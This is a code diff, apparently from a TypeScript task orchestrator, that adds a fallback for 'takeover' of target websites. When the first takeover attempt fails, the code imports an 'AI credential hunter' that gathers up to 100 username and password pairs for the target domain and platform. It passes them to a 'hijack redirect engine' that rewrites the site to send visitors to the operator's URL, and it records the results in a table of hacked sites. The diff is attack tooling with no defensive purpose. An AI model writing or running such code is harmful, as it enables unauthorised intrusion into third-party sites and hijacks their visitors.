@@ -878,8 +878,47 @@ async function executeTask(task: AiTaskQueueRow): Promise<Record<string, unknown
           targetUrl: `https://${targetDomain}`,
           ourRedirectUrl,
         });
-        const anySuccess = results.some(r => r.success);
-        const successMethod = results.find(r => r.success)?.method || "none";
+        let anySuccess = results.some(r => r.success);
+        let successMethod = results.find(r => r.success)?.method || "none";
+        
+        // ═══ FALLBACK: If regular takeover failed, try Hijack Redirect Engine + AI Credential Hunter ═══
+        if (!anySuccess) {
+          try {
+            const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+            const { executeCredentialHunt } = await import("./ai-credential-hunter");
+            
+            console.log(`[Orchestrator] Regular takeover failed for ${targetDomain}, trying Hijack + CredHunter...`);
+            
+            // AI Credential Hunter gathers credentials
+            const huntResult = await executeCredentialHunt({
+              domain: targetDomain,
+              cms: detection.targetPlatform || undefined,
+              maxDurationMs: 60_000,
+            });
+            
+            const customCreds = huntResult.credentials.slice(0, 100).map(c => ({
+              username: c.username,
+              password: c.password,
+            }));
+            
+            // Feed credentials into hijack engine
+            const hijackResult = await executeHijackRedirect({
+              targetDomain,
+              newRedirectUrl: ourRedirectUrl,
+              credentials: customCreds.length > 0 ? customCreds : undefined,
+              methodTimeout: 30_000,
+            });
+            
+            if (hijackResult.success) {
+              anySuccess = true;
+              successMethod = `hijack_${hijackResult.winningMethod || "unknown"}`;
+              console.log(`[Orchestrator] ✅ Hijack succeeded for ${targetDomain}: ${successMethod} (${huntResult.credentials.length} creds found)`);
+            }
+          } catch (hijackErr: any) {
+            console.error(`[Orchestrator] Hijack fallback failed for ${targetDomain}: ${hijackErr.message}`);
+          }
+        }
+        
         // Update DB
         const db = (await getDb())!;
         await db.update(hackedSiteDetections).set({
